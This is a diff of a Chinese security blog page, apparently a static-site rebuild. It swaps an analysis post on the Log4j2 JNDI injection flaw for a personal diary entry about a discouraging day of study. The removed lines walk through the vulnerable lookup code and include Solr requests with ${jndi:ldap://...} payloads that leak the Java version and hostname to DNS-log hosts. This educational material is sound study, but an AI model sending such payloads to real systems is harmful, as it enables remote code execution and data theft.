@@ -16,36 +16,27 @@
   <meta name="author" content="Zjacky">
   <meta name="keywords" content="Zjacky">
   
-    <meta name="description" content="简介Log4j是Apache的一个开源项目，通过使用Log4j，我们可以控制日志信息输送的目的地是控制台、文件、GUI组件，甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等；我们也可以控制每一条日志的输出格式；通过定义每一条日志信息的级别，我们能够更加细致地控制日志的生成过程。最令人感兴趣的就是，这些可以通过一个配置文件来灵活地进行配置，而不需要修改应用的代码 ‍ 原理​ 由">
+    <meta name="description" content="​	好奇怪的感觉，今天是2023.12.15日，什么都没发生，再次之前接了个培训，说是五天的Web培训，价格中规中矩吧，但要求真的一堆，又是一定要什么红队技巧，又是要什么CTF题，还得自己搭建平台来给学员在线选拔，整了好几天，各种修改，今天早上终于把Dockerfile给写完了，害，中午真不想学了，就去跟WYE的聊聊天，下午又是一个下午的课，逃掉了，但是作业要随堂检测，又没平时分了，虽然不保研，但">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Java安全 - Apache Log4j2 JNDI Injection 原理分析">
-<meta property="og:url" content="https://zjackky.github.io/post/java-security-apache-log4j2-jndi-injection-principles-analysis-z1cmsb1.html">
+<meta property="og:title" content="随记 - 记一次emo">
+<meta property="og:url" content="https://zjackky.github.io/post/record-remember-once-emo-2berae.html">
 <meta property="og:site_name" content="Zjacky Blog">
-<meta property="og:description" content="简介Log4j是Apache的一个开源项目，通过使用Log4j，我们可以控制日志信息输送的目的地是控制台、文件、GUI组件，甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等；我们也可以控制每一条日志的输出格式；通过定义每一条日志信息的级别，我们能够更加细致地控制日志的生成过程。最令人感兴趣的就是，这些可以通过一个配置文件来灵活地进行配置，而不需要修改应用的代码 ‍ 原理​ 由">
+<meta property="og:description" content="​	好奇怪的感觉，今天是2023.12.15日，什么都没发生，再次之前接了个培训，说是五天的Web培训，价格中规中矩吧，但要求真的一堆，又是一定要什么红队技巧，又是要什么CTF题，还得自己搭建平台来给学员在线选拔，整了好几天，各种修改，今天早上终于把Dockerfile给写完了，害，中午真不想学了，就去跟WYE的聊聊天，下午又是一个下午的课，逃掉了，但是作业要随堂检测，又没平时分了，虽然不保研，但">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312151415999.png">
-<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312151415469.png">
-<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312151415622.png">
-<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312151415780.png">
-<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312151415949.png">
-<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312151415135.png">
-<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312151415261.png">
-<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312151415480.png">
-<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312151415668.png">
-<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312151415808.png">
-<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312151415948.png">
-<meta property="article:published_time" content="2023-12-15T06:07:55.000Z">
-<meta property="article:modified_time" content="2023-12-15T06:14:58.000Z">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312151833218.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312151833863.png">
+<meta property="article:published_time" content="2023-12-15T10:11:37.000Z">
+<meta property="article:modified_time" content="2023-12-15T10:33:23.000Z">
 <meta property="article:author" content="Zjacky">
-<meta property="article:tag" content="Java安全">
+<meta property="article:tag" content="随记">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312151415999.png">
+<meta name="twitter:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312151833218.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>Java安全 - Apache Log4j2 JNDI Injection 原理分析 - Zjacky Blog</title>
+  <title>随记 - 记一次emo - Zjacky Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -223,7 +214,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Java安全 - Apache Log4j2 JNDI Injection 原理分析"></span>
+            <span id="subtitle" data-typed-text="随记 - 记一次emo"></span>
           
         </div>
 
@@ -234,8 +225,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-12-15 14:07" pubdate>
-          2023年12月15日 下午
+        <time datetime="2023-12-15 18:11" pubdate>
+          2023年12月15日 晚上
         </time>
       </span>
     
@@ -246,7 +237,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          690 字
+          705 字
         
       </span>
     
@@ -306,12 +297,12 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">Java安全 - Apache Log4j2 JNDI Injection 原理分析</h1>
+            <h1 id="seo-header">随记 - 记一次emo</h1>
             
               <p class="note note-info">
                 
                   
-                    本文最后更新于：2023年12月15日 下午
+                    本文最后更新于：2023年12月15日 晚上
                   
                 
               </p>
@@ -319,51 +310,14 @@
             
               <div class="markdown-body">
                 
-                <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Log4j是Apache的一个开源项目，通过使用Log4j，我们可以控制日志信息输送的目的地是控制台、文件、GUI组件，甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等；我们也可以控制每一条日志的输出格式；通过定义每一条日志信息的级别，我们能够更加细致地控制日志的生成过程。最令人感兴趣的就是，这些可以通过一个配置文件来灵活地进行配置，而不需要修改应用的代码</p>
-<p>‍</p>
-<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312151415999.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
-<p>由于Apache Log4j2某些功能存在递归解析，攻击者可在未经身份验证的情况下构造发送带有攻击语句的数据请求包，最终造成在目标服务器上执行任意代码</p>
-<p>依赖</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>log4j-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.14.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>log4j-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.14.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
-
-<p>demo</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><span class="hljs-keyword">import</span> org.apache.logging.log4j.LogManager;<br><span class="hljs-keyword">import</span> org.apache.logging.log4j.Logger;<br><span class="hljs-keyword">import</span> java.util.function.LongFunction;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LogManager.getLogger(LongFunction.class);<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;$&#123;java:os&#125;&quot;</span>;<br>        logger.error(<span class="hljs-string">&quot;error info:&#123;&#125;&quot;</span>,message);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
-
-<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312151415469.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
-<p>在执行上述代码的时候可以发现他对我们的<code>$&#123;java.os&#125;</code>​进行了解析,那么对此我们进行分析为什么会对<code>$&#123;</code>​进行解析？</p>
-<p>于是前面的直接跳过，直接在这个包下下断点，因为这个类是拿来对日志信息进行打印的</p>
-<p><code>log4j-core-2.14.1.jar!\org\apache\logging\log4j\core\layout\PatternLayout#toSerializable()</code>​</p>
-<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312151415622.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
-<p>两个传进去进行处理的变量，一个是 event，也就是我们 log4j2 需要来进行日志打印的内容；另外一个 buffer，我们会把打印出来的东西写进 buffe</p>
-<p>这里其实没有必要跟进这个<code>format</code>​方法(有别的师傅踩坑了) 直接让<code>i = 8</code>​ 来看是什么</p>
-<p>发现是走到了<code>log4j-core-2.14.1.jar!\org\apache\logging\log4j\core\pattern\MessagePatternConverter#format()</code>​中</p>
-<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312151415780.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
-<p>当我们进到这个<code>format()</code>​方法里面之后，先判断是否是 Log4j2 的 lookups 功能。这里我们是 lookups 功能，所以可以继续往下走然后继续往下走，会遍历 workingBuilder 来进行判断；如果 workingBuilder 中存在<code>$&#123;</code>​，那么就会取出从 $ 开始知道最后的字符串，这一步</p>
-<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312151415949.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
-<p>但是这里有个<code>replace</code>​方法会不会进行一个替换呢？ 跟进</p>
-<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312151415135.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
-<p>接着调用了<code>substitute</code>​方法</p>
-<p>这里就是获取payload了，这里存在一个while 循环 会对字符进行逐字匹配<code>$&#123;</code>​然后进行循环读取，知道读取到<code>&#125;</code>​ 并获取其坐标，然后将 <code>$&#123;&#125;</code>​ 中间的内容取出来</p>
-<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312151415261.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
-<p>将 <code>varName</code>​ 作为变量传入了 <code>resolveVariable</code>​ 函数</p>
-<p>这里我们看到<code>resolveVariable()</code>​方法里面是调用了<code>lookup()</code>​方法，这个<code>lookup()</code>​方法也就是 jndi 里面原生的方法，在我们让 jndi 去调用 ldap 服务的时候，是调用原生的<code>lookup()</code>​方法的</p>
-<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312151415480.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
-<p>‍</p>
-<p>总结一下</p>
-<ol>
-<li>先判断内容中是否有<code>$&#123;&#125;</code>​，然后截取<code>$&#123;&#125;</code>​中的内容，得到我们的恶意payload<code>jndi:xxx</code>​</li>
-<li>后使用<code>:</code>​分割payload，通过前缀来判断使用何种解析器去调用对应协议的<code>lookup</code>​方法 ，写了<code>JNDI</code>​就会去用<code>JNDI</code>​去调ldap</li>
-<li>支持的前缀包括<code>date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j</code>​</li>
-</ol>
-<p>最后就造成了JNDI注入</p>
-<p>‍</p>
-<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312151415668.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
-<p>solr的话就是一个接口存在log4j2</p>
-<p>‍</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xml">GET /solr/admin/cores?action=$&#123;jndi:ldap://$&#123;sys:java.version&#125;.yujrzdhxzy.dgrh3.cn&#125; HTTP/1.1<br>Host: 192.168.0.130:8983<br>Accept-Encoding: gzip, deflate<br>Accept: */*<br>Accept-Language: en<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36<br>Connection: close<br><br>GET /solr/admin/cores?action=$&#123;jndi:ldap://$&#123;env.HOSTNAME&#125;.qv2yc5.dnslog.cn&#125; HTTP/1.1<br>Host: 192.168.0.130:8983<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36<br>Accept-Encoding: gzip, deflate<br>Accept: */*<br>Cookie: JSESSIONID=59B4699E94286E436A0472BBD0D54CF8<br>Connection: close<br><br></code></pre></td></tr></table></figure>
-
-<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312151415808.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
-<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312151415948.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+                <h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>​	好奇怪的感觉，今天是2023.12.15日，什么都没发生，再次之前接了个培训，说是五天的Web培训，价格中规中矩吧，但要求真的一堆，又是一定要什么红队技巧，又是要什么CTF题，还得自己搭建平台来给学员在线选拔，整了好几天，各种修改，今天早上终于把<code>Dockerfile</code>给写完了，害，中午真不想学了，就去跟WYE的聊聊天，下午又是一个下午的课，逃掉了，但是作业要随堂检测，又没平时分了，虽然不保研，但在上课期间逃课感觉就是静不下心来学习，所以下午去看了一眼师傅们的博客，emmm发现好多都看不懂(<del>静不下心</del>)，然后去碰了一下自己爆金币的知识星球学了一手报错的<code>Spel</code>注入，但是自己搭建的时候不知道为啥，确实能报错，也捕获了报错信息，但是并没有执行危险语句外带，然后搞了半天没玩明白，寄了。</p>
+<p>然后刷了会手机，又发现efo-cms这套源码有师傅写了审计文章，那么就自己试试能否复现吧，结果沃日了maven没报错一执行全是这个错误(<del>包是在maven中难道不也算是软件包吗</del>)</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312151833218.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>​	我tmd要疯掉了，百度谷歌好久都没结果，可能这就是太菜了吧。</p>
+<p>​	然后不知道干啥，学不明白，又去看了一下组长的<code>Java安全大杂烩的CTF题-buggyloader</code>,题目很好，跟我没关系而已，codeql去找链子打二次反序列化打内存马，哥我看得懂吗？？害又被自己菜哭了，更哭笑不得的是，女朋友跟我一样都在emo，他面临着毕业设计的开题，也忙的焦头烂额，我是被自己菜哭了真的，呜呜呜，好羡慕我友链上的人啊，两个警察爷，技术还好，害，可能这就是菜逼Jack吧，每天都是想成为群友中的<code>Jack神</code></p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312151833863.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>​	结果我又不死心，就去看了一下团队的周报，突然注意到<code>Xenc</code>爹，于是看了他分享的一些Java和.NET流量绕Waf的内容，很好，哥们又没看懂，是一点都没看懂啊啊啊！你们这群爹的东西我是真看不明白了。明天就是强网了，害，好难，希望自己能出题吧，线下肯定是没机会的了，那都是Pwn爹玩的游戏，跟Web狗有什么关系？</p>
+<p>​	算了，emo归emo，现在去外面吃个饭买个奶茶，回来洗个澡再看看师傅们的博客周报公众号吧(回顾一天到底学了什么: 答案是0 )。今天就这样了，什么都没干，一事无成。又是羡慕群友的一天</p>
 <p>‍</p>
 <p>‍</p>
 
@@ -384,7 +338,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/Java%E5%AE%89%E5%85%A8/" class="category-chain-item">Java安全</a>
+  <a href="/categories/%E9%9A%8F%E8%AE%B0/" class="category-chain-item">随记</a>
   
   
 
@@ -399,7 +353,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/Java%E5%AE%89%E5%85%A8/" class="print-no-link">#Java安全</a>
+        <a href="/tags/%E9%9A%8F%E8%AE%B0/" class="print-no-link">#随记</a>
       
     </div>
   
@@ -411,8 +365,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Java安全 - Apache Log4j2 JNDI Injection 原理分析</div>
-      <div>https://zjackky.github.io/post/java-security-apache-log4j2-jndi-injection-principles-analysis-z1cmsb1.html</div>
+      <div>随记 - 记一次emo</div>
+      <div>https://zjackky.github.io/post/record-remember-once-emo-2berae.html</div>
     </div>
     <div class="license-meta">
       
@@ -456,18 +410,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/post/record-remember-once-emo-2berae.html" title="随记 - 记一次emo">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">随记 - 记一次emo</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/post/java-safety-shiro-revitalization-principles-analysis-1wmw4g.html" title="Java安全 - Shiro反序列化原理分析">
-                        <span class="hidden-mobile">Java安全 - Shiro反序列化原理分析</span>
+                      <a href="/post/java-security-apache-log4j2-jndi-injection-principles-analysis-z1cmsb1.html" title="Java安全 - Apache Log4j2 JNDI Injection 原理分析">
+                        <span class="hidden-mobile">Java安全 - Apache Log4j2 JNDI Injection 原理分析</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
